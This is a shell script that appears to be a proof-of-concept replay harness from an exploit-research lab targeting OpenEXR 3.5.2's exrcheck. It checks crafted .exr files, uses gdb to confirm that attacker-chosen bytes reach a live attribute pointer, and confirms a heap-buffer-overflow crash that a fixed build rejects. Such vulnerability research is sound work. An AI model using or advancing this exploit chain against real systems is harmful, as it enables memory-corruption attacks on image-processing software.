#!/bin/sh
# W193: one-command replay.  Three files differ only in eight file bytes
# written by the pinned ZSTD inverse-sort into a live exr_attribute_t* slot
# in the unmodified pinned 3.5.2 exrcheck -c consumer.  ASLR is left ON;
# the chosen pointer values come from the files, not from the heap base.
# A SIGSEGV in the attribute-destruction loop is the consumer-visible
# result.  This is rung-4 chosen bytes in a live pointer field, not rung 5:
# no wire, command, marker, witness verdict or chosen control flow proven.
set -eu
cd "$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)"
mkdir -p evidence

for spec in \
    'cases/make_poc_mixed_full.py 90f3f6fa759cfbd1453db7b161e2b6d8d67eba2b2e9978ea74b68f91d44d52c2' \
    'harness/w193-slot.cmd 9cdd17a21b97ada15f7c631a5e23ee4608caca6b2bc6ca2b9fd379e7ab82538e' \
    'cases/p193-e0-4141.exr bd78a3e62e027a736f445699c600b4ef3a9fb05bb74f224cd3e5a05b7fa02976' \
    'cases/p193-e0-4242.exr e0748e92338c693ca50d6d8968ed3d30d865807316534643ca77ed4658a34582' \
    'cases/p193-e0-3131.exr a1138a5f6880d6ae2bffc5e3c0f0c877a59caa98daded3300a25f317e868a38a'
do
    set -- $spec
    test "$(sha256sum "$1" | cut -d' ' -f1)" = "$2"
done

RAW=$(mktemp)
trap 'rm -f "$RAW"' EXIT

for tag in 4141 4242 3131; do
    gdb -q -batch \
        -ex 'set pagination off' -ex 'set confirm off' \
        -ex 'break sort2_4ByteChannels_tiled' \
        -ex "run -c cases/p193-e0-$tag.exr" \
        -x harness/w193-slot.cmd ./build-vuln-plain/bin/exrcheck \
        > "$RAW" 2>&1 || true
    grep -q '^ENTRIES_DELTA=4320 NUM=11$' "$RAW"
    grep -q "^E\[2\]=0x$tag$tag$tag$tag\$" "$RAW"
    grep -q '^E\[0\]=0x0000555555828210$' "$RAW"
    grep -q '^E\[1\]=0x0000555555828280$' "$RAW"
    grep -q '^E\[3\]=0x0000555555828330$' "$RAW"
    grep -E '^(ENTRIES_DELTA|E\[)' "$RAW" > "evidence/w193-slot-$tag.out"

    set +e
    ./build-vuln-plain/bin/exrcheck -c "cases/p193-e0-$tag.exr" \
        > "evidence/w193-plain-$tag.out" 2>&1
    plain_rc=$?
    set -e
    [ "$plain_rc" -eq 139 ]
done

set +e
./build-vuln-plain/bin/exrcheck -c cases/baseline.exr \
    > evidence/w193-valid.out 2>&1
valid_rc=$?
./build-fixed-plain/bin/exrcheck -c cases/p193-e0-4141.exr \
    > evidence/w193-fixed.out 2>&1
fixed_rc=$?
ASAN_OPTIONS=detect_leaks=0:abort_on_error=0:log_path=stderr \
    ./build-vuln-asan/bin/exrcheck -c cases/p193-e0-4141.exr \
    > "$RAW" 2>&1
asan_rc=$?
set -e
[ "$valid_rc" -eq 0 ]
[ "$fixed_rc" -eq 1 ]
[ "$asan_rc" -eq 1 ]
grep -q 'OK' evidence/w193-valid.out
grep -q 'bad' evidence/w193-fixed.out

awk '
    { gsub(/==[0-9]+==/, "==PID==") }
    { gsub(/BuildId: [0-9a-f]+/, "BuildId: ID") }
    { gsub(/\/home\/mesh-home\/mishe-tauftauf2shell\/lab\/openexr2shell-real/, "LAB") }
    { gsub(/\/home\/mesh-home\/mishe-tauftauf2shell/, "SITE") }
    { gsub(/0x[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]*/, "ADDR") }
    { print }
' < "$RAW" > evidence/w193-asan.out
grep -q 'ERROR: AddressSanitizer: heap-buffer-overflow' evidence/w193-asan.out
grep -q 'READ of size 3072' evidence/w193-asan.out
grep -q 'internal_zstd.c:472' evidence/w193-asan.out

printf 'RESULT PASS\n'
sha256sum evidence/w193-*.out
